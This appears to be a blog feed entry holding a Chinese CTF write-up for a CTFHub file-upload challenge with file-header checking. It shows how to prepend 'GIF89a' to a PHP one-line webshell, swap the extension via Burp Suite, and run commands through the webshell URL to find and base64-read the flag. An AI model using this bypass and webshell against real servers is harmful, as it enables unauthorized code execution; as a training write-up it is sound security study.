  <entry>
    <title>文件上传(文件头检查)</title>
    <link href="/Crow.github.io/2026/11/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5/"/>
    <url>/Crow.github.io/2026/11/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<p>工具:burpsuite</p><p>题源:Ctfhub</p><p>内容:在文件上传文件头检查类型中拿到flag</p><p>原理:服务器通过检查文件的前几个字节来判断文件类型,后面的看都不看</p><p>思路:用图片马骗过服务器</p><h2 id="1-进入环境"><a href="#1-进入环境" class="headerlink" title="1,进入环境"></a>1,进入环境</h2><img width="2468" height="1386" alt="Image" src="https://github.com/user-attachments/assets/a523a360-14aa-4796-97cf-84f3810c7e2b" /><h2 id="2-上传之前的图片马-png"><a href="#2-上传之前的图片马-png" class="headerlink" title="2,上传之前的图片马(.png)"></a>2,上传之前的图片马(.png)</h2><p>上传成功并返回了路径</p><img width="2478" height="1214" alt="Image" src="https://github.com/user-attachments/assets/05c2de52-a5fe-4078-a467-e36e2cff04bd" /><img width="2480" height="1204" alt="Image" src="https://github.com/user-attachments/assets/a6a2975e-3a5d-49ef-9cee-a5daf10d3475" /><h2 id="3-改后缀为-php并重新上传-让服务器执行php指令"><a href="#3-改后缀为-php并重新上传-让服务器执行php指令" class="headerlink" title="3,改后缀为.php并重新上传(让服务器执行php指令)"></a>3,改后缀为.php并重新上传(让服务器执行php指令)</h2><p>很遗憾,上传失败</p><p>说明这题不止盯着文件头,还对上传的文件类型进行了限制</p><img width="2484" height="1178" alt="Image" src="https://github.com/user-attachments/assets/fb63d9d9-c808-4291-b1a9-dc17b807881d" /><h2 id="4-想到用burpsuite抓包改包"><a href="#4-想到用burpsuite抓包改包" class="headerlink" title="4,想到用burpsuite抓包改包"></a>4,想到用burpsuite抓包改包</h2><p>我们用之前的一个一句话木马重新做一个图片马(因为科比图片马里面没有参数,不能用来拿flag)</p><img width="656" height="534" alt="Image" src="https://github.com/user-attachments/assets/68ce0ef5-5f50-43c1-b335-32e22d0d9665" /><p>终端执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;GIF89a&#x27;</span>; <span class="hljs-built_in">cat</span> shell2.php; &#125; &gt; shell2.png<br></code></pre></td></tr></table></figure><p>前面的GIF89a是用来骗过文件头检查的,后面直接就是一句话木马</p><p>进行抓包改包,把.png换成.php后send</p><p>显示上传成功,并返回路径</p><img width="2484" height="1214" alt="Image" src="https://github.com/user-attachments/assets/5fc9990c-f512-4d34-8a7b-9161346f9235" /><h2 id="5-运行木马"><a href="#5-运行木马" class="headerlink" title="5,运行木马"></a>5,运行木马</h2><h3 id="a-查看目录"><a href="#a-查看目录" class="headerlink" title="a,查看目录"></a>a,查看目录</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-898cce34929d2270.sandbox.ctfhub.com:10800/upload/shell2.php?cmd=ls%20/<br></code></pre></td></tr></table></figure><p>成功返回:说明木马有效</p><img width="2484" height="1266" alt="Image" src="https://github.com/user-attachments/assets/b6867ead-fa3f-4b4b-b9b1-1dd11670c06f" /><h3 id="b-找flag"><a href="#b-找flag" class="headerlink" title="b,找flag"></a>b,找flag</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-898cce34929d2270.sandbox.ctfhub.com:10800/upload/shell2.php?cmd=find%20/%20-name%20%22flag*%22%202%3E/dev/null<br></code></pre></td></tr></table></figure><p>找到了flag的路径<code>/var/www/html/flag_1709510835.php</code></p><img width="2484" height="1290" alt="Image" src="https://github.com/user-attachments/assets/2edba8eb-855b-4dcb-aaec-4d239eda6fe1" /><h3 id="c-访问flag的目录"><a href="#c-访问flag的目录" class="headerlink" title="c,访问flag的目录"></a>c,访问flag的目录</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-898cce34929d2270.sandbox.ctfhub.com:10800/flag_1709510835.php<br></code></pre></td></tr></table></figure><p>仅返回图片马里的文件头</p><p>估计是要用base64,这是ctfhub的常用套路</p><img width="2486" height="1286" alt="Image" src="https://github.com/user-attachments/assets/3fe8148d-cd0d-4f60-99fa-13fbdb11a686" /><h3 id="d-用base64重新访问"><a href="#d-用base64重新访问" class="headerlink" title="d,用base64重新访问"></a>d,用base64重新访问</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-898cce34929d2270.sandbox.ctfhub.com:10800/upload/shell2.php?cmd=base64%20/var/www/html/flag_1709510835.php<br></code></pre></td></tr></table></figure><img width="2480" height="1280" alt="Image" src="https://github.com/user-attachments/assets/4a518811-6c5e-4b28-9391-f3af5f7ebfb6" /><h3 id="e-得到乱码-交给在线解码平台解码"><a href="#e-得到乱码-交给在线解码平台解码" class="headerlink" title="e,得到乱码,交给在线解码平台解码"></a>e,得到乱码,交给在线解码平台解码</h3><p>记得删掉前面伪装图片的字符,不然解码会乱</p><img width="946" height="748" alt="Image" src="https://github.com/user-attachments/assets/f6db3919-3e26-4cd2-ab45-0cd6a50b6835" /><p>成功拿到flag</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]></content>
    
    
